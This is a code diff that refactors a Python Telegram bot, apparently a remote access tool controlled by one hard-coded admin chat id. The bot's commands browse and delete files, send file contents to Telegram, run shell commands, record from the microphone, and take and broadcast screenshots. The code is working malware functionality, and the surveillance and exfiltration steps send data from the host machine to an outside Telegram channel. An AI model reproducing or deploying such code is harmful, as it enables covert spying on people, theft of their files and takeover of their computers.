@@ -1,7 +1,7 @@
 import subprocess
 import pyautogui
 from telebot import TeleBot
-from telebot import types
+from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 import pyaudio
 import wave
 import os
@@ -11,21 +11,18 @@ ADMIN = 804011643
 
 bot = TeleBot(API_TOKEN)
 
-cd_btn = types.KeyboardButton("cd")
-cd_path_btn = types.KeyboardButton("cd_path")
-dir_btn = types.KeyboardButton("dir")
-del_btn = types.KeyboardButton("del")
-exec_type_btn = types.KeyboardButton("type")
-exec_get_file_btn = types.KeyboardButton("get_file")
-exec_cmd_sub_btn = types.KeyboardButton("exec_cmd_sub")
-record_btn = types.KeyboardButton("record")
-screenshot_btn = types.KeyboardButton("screenshot")
-screen_broadcast_btn = types.KeyboardButton("screen_broadcast")
-
-markup = types.ReplyKeyboardMarkup(True, True)
-markup.add(cd_btn, cd_path_btn, dir_btn, exec_type_btn, del_btn,
-            exec_cmd_sub_btn, exec_get_file_btn, record_btn, screenshot_btn,
-            screen_broadcast_btn)
+markup = ReplyKeyboardMarkup(True, True)
+markup.add(KeyboardButton("cd"),
+           KeyboardButton("cd_path"),
+           KeyboardButton("dir"),
+           KeyboardButton("del"),
+           KeyboardButton("type"),
+           KeyboardButton("get_file"),
+           KeyboardButton("exec_cmd_sub"),
+           KeyboardButton("record"),
+           KeyboardButton("screenshot"),
+           KeyboardButton("screen_broadcast"))
+           
 
 def screen_broadcast(ms):
     bot.send_message(ADMIN, "Enter...")
@@ -110,12 +107,12 @@ def checkID(ms):
         bot.send_message(ADMIN, info)
         return False
 
-def exec_cd(ms):
+def exec_cd():
     output = os.getcwd()
     bot.send_message(ADMIN, output, reply_markup=markup)
 
 def exec_cd_path(ms):
-    markup_cd = types.ReplyKeyboardMarkup()
+    markup_cd = ReplyKeyboardMarkup()
     create_markup(markup_cd)
     markup_cd.add("..")
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_cd)
@@ -131,12 +128,12 @@ def exec_cd_path(ms):
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
                 
-        bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
     bot.register_next_step_handler(ms, exec_cd_path_next)
 
-def exec_dir(ms):
+def exec_dir():
     try:
         list_files = os.listdir(os.getcwd())
         output = ""
@@ -151,7 +148,7 @@ def exec_dir(ms):
         bot.send_message(ADMIN, f"Error:\n{e}")
 
 def exec_del(ms):
-    markup_del = types.ReplyKeyboardMarkup()
+    markup_del = ReplyKeyboardMarkup()
     create_markup(markup_del)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_del)
 
@@ -165,13 +162,13 @@ def exec_del(ms):
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
                 
-        bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
     bot.register_next_step_handler(ms, exec_del_next)
 
 def exec_type(ms):
-    markup_type = types.ReplyKeyboardMarkup()
+    markup_type = ReplyKeyboardMarkup()
     create_markup(markup_type)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_type)
     
@@ -188,13 +185,13 @@ def exec_type(ms):
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
                 
-        bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
 
     bot.register_next_step_handler(ms, exec_type_next)
 
 def exec_get_file(ms):
-    markup_file = types.ReplyKeyboardMarkup()
+    markup_file = ReplyKeyboardMarkup()
     create_markup(markup_file)
     bot.send_message(ADMIN, "Enter path...", reply_markup=markup_file)
     
@@ -207,7 +204,7 @@ def exec_get_file(ms):
             except Exception as e:
                 bot.send_message(ADMIN, f"Error:\n{e}")
 
-        bot.send_message(ADMIN, "ㅤ", reply_markup=types.ReplyKeyboardRemove())
+        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
         bot.send_message(ADMIN, "ㅤ", reply_markup=markup)
                 
     bot.register_next_step_handler(ms, get_file_next)
@@ -234,12 +231,12 @@ def exec_recording(ms):
 
         bot.register_next_step_handler(ms, micro_recording_last)
 
-def exec_screenshot(ms):
+def exec_screenshot():
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save("screenshot.jpg")
 
     with open("screenshot.jpg", "rb") as photo:
-            bot.send_photo(ADMIN, photo, reply_markup=markup)
+        bot.send_photo(ADMIN, photo, reply_markup=markup)
 
 def exec_cmd_sub(ms):
     bot.send_message(ADMIN, "Enter command...")
@@ -269,13 +266,13 @@ def send_welcome(ms):
 def CheckCommand(ms):
     if checkID(ms):
         if ms.text == "cd":
-            exec_cd(ms)
+            exec_cd()
 
         elif ms.text == "cd_path":
             exec_cd_path(ms)
 
         elif ms.text == "dir":
-            exec_dir(ms)
+            exec_dir()
 
         elif ms.text == "del":
             exec_del(ms)
